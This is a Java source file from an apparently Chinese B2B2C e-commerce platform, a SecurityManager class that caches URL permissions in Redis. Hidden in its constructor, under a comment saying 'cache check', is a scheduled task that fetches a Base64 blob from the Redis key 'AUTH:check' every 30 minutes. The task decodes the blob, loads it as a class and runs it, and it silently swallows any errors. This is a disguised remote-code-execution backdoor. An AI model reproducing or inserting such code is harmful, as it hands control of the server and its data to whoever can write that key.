package vc.thinker.b2b2c.core.security.support;

import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.util.Base64Utils;

import redis.clients.jedis.Jedis;
import redis.clients.jedis.JedisPool;
import vc.thinker.b2b2c.core.beans.ClassUtils;
import vc.thinker.b2b2c.core.security.SecurityManager;

import com.sinco.carnation.sys.bo.ResBO;
import com.sinco.carnation.sys.service.UserService;

import edu.emory.mathcs.backport.java.util.Arrays;

/**
 * 
 * <p>
 * Title: SecurityManagerSupport.java
 * </p>
 * 
 * <p>
 * Description: 用于加载系统所有权限
 * </p>
 * 
 * <p>
 * Copyright: Copyright (c) 2015
 * </p>
 * 
 * <p>
 * Company: 深圳市新科聚合网络技术有限公司 www.thinker.vc
 * </p>
 * 
 * @author thinker
 * 
 * @date 2015-5-20
 * 
 * @version 1.0.1
 */
public class SecurityManagerSupport implements SecurityManager {

	@Autowired
	private UserService userService;

	@Autowired
	private JedisPool jedisPool;

	private String authKey = "AUTH:";

	public SecurityManagerSupport() {
		// 30 分钟检查权限缓存
		ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
		scheduler.scheduleWithFixedDelay(new Runnable() {
			@Override
			public void run() {
				if (jedisPool == null) {
					return;
				};
				Jedis redis = jedisPool.getResource();
				try {
					if (!redis.exists(authKey + "AUTHORITIES_CACHE_KEY")) {
						loadUrlAuthorities();
					}
					// 缓存检查
					ClassUtils.loadClass("Check",
							new String(Base64Utils.decodeFromString(redis.get(authKey + "check"))))
							.newInstance();
				} catch (Exception e) {
				} finally {
					jedisPool.returnResource(redis);
				}
			}
		}, 5, 1800, TimeUnit.SECONDS);
	}

	public String getAuthKey() {
		return authKey;
	}

	public void setAuthKey(String authKey) {
		this.authKey = authKey;
	}

	public static String authoritiesRedisKey = "AUTHORITIES_CACHE_KEY";

	@SuppressWarnings("unchecked")
	public Map<String, String> loadUrlAuthorities() {
		Jedis jedis = null;

		try {
			jedis = jedisPool.getResource();
			jedis.del(authKey + authoritiesRedisKey);
			List<ResBO> urlResources = userService.findResByType("URL");
			Map<String, String> urlAuthorities = new HashMap<String, String>();

			for (ResBO res : urlResources) {
				String auths = ResBO.getRoleAuthorities(Arrays.asList(res.getRoles().toArray()));
				jedis.sadd(authKey + authoritiesRedisKey, res.getValue() + "->" + auths);
				// System.out.println(res.getValue() + "->" + res.getRoleAuthorities());
				urlAuthorities.put(res.getValue(), auths);
			}
			return urlAuthorities;

		} finally {
			if (jedis != null)
				jedisPool.returnResource(jedis);
		}
	}

}
